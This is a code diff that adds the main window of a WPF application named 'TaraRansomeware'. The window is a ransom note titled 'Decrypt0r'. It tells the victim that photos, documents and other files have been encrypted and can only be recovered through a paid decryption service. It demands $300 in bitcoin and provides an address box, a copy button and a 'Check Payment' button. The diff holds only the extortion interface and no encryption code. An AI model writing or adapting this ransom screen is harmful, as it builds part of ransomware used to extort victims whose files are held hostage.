@@ -5,8 +5,65 @@
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:TaraRansomeware"
         mc:Ignorable="d"
-        Title="MainWindow" Height="450" Width="800">
-    <Grid>
-        
+        Title="TaraRansomeware - Decrypt0r" Height="600" Width="800" Background="White" ResizeMode="NoResize">
+    <Grid Margin="10">
+        <Grid.ColumnDefinitions>
+            <ColumnDefinition/>
+        </Grid.ColumnDefinitions>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="auto"/>
+            <RowDefinition Height="2*"/>
+            <RowDefinition Height="1*"/>
+        </Grid.RowDefinitions>
+        <TextBlock x:Name="TextTitle" TextWrapping="Wrap" FontSize="36" Margin="10" Width="755" Padding="10,0,0,0"><Run Text="Oops!"/><LineBreak/><Run Text="Your Files Have been Encrypted!"/></TextBlock>
+        <RichTextBox x:Name="richTextBox" Margin="0,10,10,0" Grid.Row="1" VerticalAlignment="Top" IsReadOnly="True" VerticalScrollBarVisibility="Auto" MinWidth="20" Height="274.04" HorizontalAlignment="Right" Width="755" FontSize="16">
+            <FlowDocument>
+                <Paragraph>
+                    <Run FontWeight="Bold" FontSize="24" Text="What's wrong with my computer?"/>
+                </Paragraph>
+                <Paragraph>
+                    <Run Text="Some of your important files were saved by my encryption"/>
+                </Paragraph>
+                <Paragraph>
+                    <Run Text="Photos, pictures, documents, compressed packages, audio, video files, exe files, etc., almost all types of files are encrypted, and therefore can not open normally."/>
+                </Paragraph>
+                <Paragraph>
+                    <Run Text="This is a fundamental difference between the general file damage, you can find a way to restore the file on the Internet, I guarantee that we do not have the decryption service, even if God can not restore these documents."/>
+                </Paragraph>
+                <Paragraph>
+                    <Run FontWeight="Bold" FontSize="24" Text="Is there a way to restore these documents?"/>
+                </Paragraph>
+                <Paragraph>
+                    <Run Text="Of course there are recoverable methods. Can only be restored through our decryption service."/>
+                </Paragraph>
+                <Paragraph>
+                    <Run Text="But this is a charge, and can not be infinitely delayed."/>
+                </Paragraph>
+                <Paragraph>
+                    <Run/>
+                </Paragraph>
+            </FlowDocument>
+        </RichTextBox>
+        <Grid Grid.Row="2">
+            <Grid.ColumnDefinitions>
+                <ColumnDefinition/>
+                <ColumnDefinition Width="4*"/>
+            </Grid.ColumnDefinitions>
+            <Image x:Name="image" HorizontalAlignment="Left" Height="127.02" Margin="10,10,0,0" VerticalAlignment="Top" Width="135" Source="BC_Logo.png"/>
+            <Grid Grid.Column="1">
+                <Grid.RowDefinitions>
+                    <RowDefinition Height="1*"/>
+                    <RowDefinition Height="Auto"/>
+                    <RowDefinition Height="1*"/>
+                </Grid.RowDefinitions>
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition/>
+                </Grid.ColumnDefinitions>
+                <Label x:Name="RansomeLabel" Content="Send $300 worth bitcoin to this address:" FontSize="24" VerticalAlignment="Center" Margin="0,-6,0,0"/>
+                <TextBox x:Name="BtcAddressBox" Grid.Row="1" TextWrapping="Wrap" Text="" FontSize="18" FontFamily="Consolas" Margin="0,0,90,0"/>
+                <Button x:Name="Copy" Content="Copy" HorizontalAlignment="Left" Margin="535,0,0,0" Grid.Row="1" Width="75" Click="BtnClkCopy"/>
+                <Button x:Name="CheckPayment" Content="Check Payment" HorizontalAlignment="Center" Height="36" Margin="0" Grid.Row="2" VerticalAlignment="Center" Width="300" FontSize="16" Click="CheckPayment_Click"/>
+            </Grid>
+        </Grid>
     </Grid>
 </Window>
